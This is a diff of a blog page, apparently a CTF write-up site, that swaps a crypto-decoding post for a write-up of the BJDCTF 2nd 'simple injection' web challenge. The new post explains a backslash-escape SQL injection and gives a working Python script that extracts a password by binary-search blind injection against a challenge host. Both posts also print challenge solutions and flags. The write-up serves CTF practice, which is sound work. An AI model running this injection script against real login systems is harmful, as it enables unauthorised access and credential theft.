@@ -5,7 +5,7 @@
     
 <meta charset="utf-8" >
 
-<title>[XMAN2018排位赛]通行证 | ev11ccaatt</title>
+<title>[BJDCTF 2nd]简单注入 | ev11ccaatt</title>
 <meta name="description" content="人菜多学">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -80,37 +80,59 @@
       <div class="content-container">
         <div class="post-detail">
           
-          <h2 class="post-title">[XMAN2018排位赛]通行证</h2>
+          <h2 class="post-title">[BJDCTF 2nd]简单注入</h2>
           <div class="post-info post-detail-info">
-            <span><i class="icon-calendar-outline"></i> 2021-03-25</span>
+            <span><i class="icon-calendar-outline"></i> 2021-04-06</span>
             
           </div>
           <div class="post-content">
-            <p>这道题是水的一题</p>
-<p>这两天身体不舒服，水一下。</p>
-<p>下载</p>
-<pre><code>a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg==
+            <p>进去是个登陆界面，试一下username=amdin，password=1&quot;</p>
+<p>弹出stophacking,那么应该是个注入了。</p>
+<p>这里在passowrd测试了一会，无果，去扫一下目录。</p>
+<p>扫到hint.txt</p>
+<p>给了sql语句</p>
+<pre><code class="language-select"></code></pre>
+<p>这里需要\来转义'从而将$_POST[&quot;password&quot;]释放出来.<br>
+语句会变为</p>
+<pre><code>`select * from users where username=('$_POST[&quot;username&quot;] and password=' )($_POST[&quot;password&quot;]');
 </code></pre>
-<p>base64解密</p>
-<pre><code>kanbbrgghjl{zb____}vtlaln
+<p>这样就可以在password处进行数字注入</p>
+<p>采用二分法</p>
+<pre><code>import requests
+import time
+
+url = 'http://6508e5bd-9f0d-441f-9954-107228bdd7fa.node3.buuoj.cn/index.php'
+flag = &quot;&quot;
+data  ={&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;}
+for i in range(1,1000):
+    low = 32
+    high = 128
+    mid = (low+high) // 2
+    while(low&lt;high):
+        time.sleep(0.2)
+        payload = &quot;or/**/if(ascii(substr(password,{},1))&gt;{},1,0)#&quot;.format(i,mid)  
+        data['password']=payload
+        r = requests.post(url,data=data).text
+        if &quot;stronger&quot; in r:
+            low = mid + 1
+        else:
+            high = mid
+        mid = (low+high) // 2
+        print(mid)
+    if(mid == 32 or mid ==132):
+        break
+    flag +=chr(mid)
+    print(flag)
 </code></pre>
-<p>这里卡了一会，以为要翻转，但翻过来明显不对劲，考虑下栅栏.</p>
-<p>在cyberchef试了下，竟然不是解密而是加密，key为7.</p>
-<pre><code>kzna{blnl_abj_lbh_trg_vg}
-</code></pre>
-<p>最后一步很明显了凯撒移位。（https://planetcalc.com/1434/）</p>
-<pre><code>ROT13	xman{oyay_now_you_get_it}
-</code></pre>
-<p>收工，睡觉.</p>
 
           </div>
         </div>
 
         
           <div class="next-post">
-            <a class="purple-link" href="https://ev11ccaatt.github.io/post/csawqual-2019web_unagi/">
+            <a class="purple-link" href="https://ev11ccaatt.github.io/post/bjdctf-2ndfake-google/">
               <h3 class="post-title">
-                下一篇：[CSAWQual 2019]Web_Unagi
+                下一篇：[BJDCTF 2nd]fake google
               </h3>
             </a>
           </div>
